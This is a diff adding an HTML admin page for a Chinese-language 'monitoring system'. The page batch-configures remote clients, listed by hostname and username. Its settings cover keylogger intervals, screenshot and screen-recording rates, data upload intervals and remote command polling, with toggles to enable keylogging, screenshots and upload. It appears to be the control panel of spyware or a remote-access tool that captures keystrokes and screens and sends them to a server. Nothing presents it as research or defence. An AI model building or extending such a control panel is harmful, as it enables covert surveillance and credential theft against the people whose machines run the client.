@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>监控系统 - 配置管理</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        h1, h2 {
+            color: #333;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .btn {
+            display: inline-block;
+            background-color: #4CAF50;
+            color: white;
+            padding: 8px 12px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            text-decoration: none;
+            font-size: 14px;
+            margin-right: 5px;
+        }
+        .btn:hover {
+            background-color: #45a049;
+        }
+        .btn-secondary {
+            background-color: #2196F3;
+        }
+        .btn-secondary:hover {
+            background-color: #0b7dda;
+        }
+        .config-section {
+            background-color: white;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input[type=text], input[type=number], select {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        .checkbox-label {
+            display: flex;
+            align-items: center;
+            font-weight: normal;
+        }
+        input[type=checkbox] {
+            margin-right: 10px;
+        }
+        .client-list {
+            margin-top: 20px;
+        }
+        .client-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 5px;
+        }
+        .client-info {
+            flex-grow: 1;
+            margin-left: 10px;
+        }
+        .success-message {
+            color: green;
+            background-color: #e8f5e9;
+            padding: 10px;
+            border-radius: 4px;
+            margin-top: 10px;
+            display: none;
+        }
+        .error-message {
+            color: red;
+            background-color: #ffebee;
+            padding: 10px;
+            border-radius: 4px;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>监控系统 - 配置管理</h1>
+        <div>
+            <a href="/" class="btn btn-secondary">返回首页</a>
+        </div>
+    </div>
+
+    <div class="config-section">
+        <h2>批量配置设置</h2>
+        <p>在这里可以同时为多个客户端应用相同的配置。</p>
+
+        <form id="batch-config-form">
+            <div class="form-group">
+                <label for="screenshot_interval">截图间隔 (秒)</label>
+                <input type="number" id="screenshot_interval" name="screenshot_interval" value="15" min="1" max="3600">
+            </div>
+            
+            <div class="form-group">
+                <label for="keylogger_interval">键盘记录间隔 (秒)</label>
+                <input type="number" id="keylogger_interval" name="keylogger_interval" value="1" min="0.1" max="60" step="0.1">
+            </div>
+            
+            <div class="form-group">
+                <label for="keylogger_interval_recording">录屏时键盘记录间隔 (秒)</label>
+                <input type="number" id="keylogger_interval_recording" name="keylogger_interval_recording" value="0.5" min="0.1" max="60" step="0.1">
+            </div>
+            
+            <div class="form-group">
+                <label for="upload_interval">上传间隔 (秒)</label>
+                <input type="number" id="upload_interval" name="upload_interval" value="60" min="5" max="3600">
+            </div>
+            
+            <div class="form-group">
+                <label for="check_command_interval">检查命令间隔 (秒)</label>
+                <input type="number" id="check_command_interval" name="check_command_interval" value="30" min="1" max="3600">
+            </div>
+            
+            <div class="form-group">
+                <label for="recording_duration">录屏持续时间 (秒)</label>
+                <input type="number" id="recording_duration" name="recording_duration" value="60" min="10" max="3600">
+            </div>
+            
+            <div class="form-group">
+                <label for="recording_fps">录屏帧率 (FPS)</label>
+                <input type="number" id="recording_fps" name="recording_fps" value="10" min="1" max="30">
+            </div>
+            
+            <div class="form-group">
+                <label class="checkbox-label">
+                    <input type="checkbox" id="enable_screenshot" name="enable_screenshot" checked>
+                    启用屏幕截图
+                </label>
+            </div>
+            
+            <div class="form-group">
+                <label class="checkbox-label">
+                    <input type="checkbox" id="enable_keylogger" name="enable_keylogger" checked>
+                    启用键盘记录
+                </label>
+            </div>
+            
+            <div class="form-group">
+                <label class="checkbox-label">
+                    <input type="checkbox" id="enable_upload" name="enable_upload" checked>
+                    启用数据上传
+                </label>
+            </div>
+            
+            <h3>选择客户端</h3>
+            <div class="client-list" id="client-list">
+                <!-- 客户端列表将通过JavaScript动态加载 -->
+                <div class="client-item">
+                    <input type="checkbox" id="select-all" name="select-all">
+                    <label for="select-all" class="client-info">全选</label>
+                </div>
+            </div>
+            
+            <button type="submit" class="btn">应用配置</button>
+            <div id="success-message" class="success-message"></div>
+            <div id="error-message" class="error-message"></div>
+        </form>
+    </div>
+
+    <script>
+        // 获取客户端列表
+        function loadClients() {
+            fetch('/api/clients')
+                .then(response => response.json())
+                .then(data => {
+                    const clientList = document.getElementById('client-list');
+                    const selectAll = document.getElementById('select-all');
+                    
+                    // 移除现有客户端（除了全选选项）
+                    while (clientList.children.length > 1) {
+                        clientList.removeChild(clientList.lastChild);
+                    }
+                    
+                    // 添加客户端
+                    for (const [clientId, client] of Object.entries(data)) {
+                        const clientItem = document.createElement('div');
+                        clientItem.className = 'client-item';
+                        
+                        const checkbox = document.createElement('input');
+                        checkbox.type = 'checkbox';
+                        checkbox.id = `client_${clientId}`;
+                        checkbox.name = 'client_ids[]';
+                        checkbox.value = clientId;
+                        
+                        const label = document.createElement('label');
+                        label.htmlFor = `client_${clientId}`;
+                        label.className = 'client-info';
+                        label.textContent = `${client.hostname} (${client.username})`;
+                        
+                        clientItem.appendChild(checkbox);
+                        clientItem.appendChild(label);
+                        clientList.appendChild(clientItem);
+                    }
+                    
+                    // 全选功能
+                    selectAll.addEventListener('change', function() {
+                        const checkboxes = document.querySelectorAll('input[name="client_ids[]"]');
+                        checkboxes.forEach(checkbox => {
+                            checkbox.checked = this.checked;
+                        });
+                    });
+                })
+                .catch(error => {
+                    console.error('获取客户端列表出错:', error);
+                });
+        }
+        
+        // 提交表单
+        document.getElementById('batch-config-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const successMessage = document.getElementById('success-message');
+            const errorMessage = document.getElementById('error-message');
+            successMessage.style.display = 'none';
+            errorMessage.style.display = 'none';
+            
+            // 获取选中的客户端
+            const clientCheckboxes = document.querySelectorAll('input[name="client_ids[]"]:checked');
+            const clientIds = Array.from(clientCheckboxes).map(cb => cb.value);
+            
+            if (clientIds.length === 0) {
+                errorMessage.textContent = '请至少选择一个客户端';
+                errorMessage.style.display = 'block';
+                return;
+            }
+            
+            // 获取配置
+            const config = {
+                screenshot_interval: parseInt(document.getElementById('screenshot_interval').value),
+                keylogger_interval: parseFloat(document.getElementById('keylogger_interval').value),
+                keylogger_interval_recording: parseFloat(document.getElementById('keylogger_interval_recording').value),
+                upload_interval: parseInt(document.getElementById('upload_interval').value),
+                check_command_interval: parseInt(document.getElementById('check_command_interval').value),
+                recording_duration: parseInt(document.getElementById('recording_duration').value),
+                recording_fps: parseInt(document.getElementById('recording_fps').value),
+                enable_screenshot: document.getElementById('enable_screenshot').checked,
+                enable_keylogger: document.getElementById('enable_keylogger').checked,
+                enable_upload: document.getElementById('enable_upload').checked
+            };
+            
+            // 发送请求
+            fetch('/api/config/batch', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    client_ids: clientIds,
+                    config: config
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    successMessage.textContent = data.message;
+                    successMessage.style.display = 'block';
+                } else {
+                    errorMessage.textContent = data.message || '更新配置失败';
+                    errorMessage.style.display = 'block';
+                }
+            })
+            .catch(error => {
+                errorMessage.textContent = '请求错误: ' + error.message;
+                errorMessage.style.display = 'block';
+            });
+        });
+        
+        // 页面加载时获取客户端列表
+        document.addEventListener('DOMContentLoaded', loadClients);
+    </script>
+</body>
+</html> 
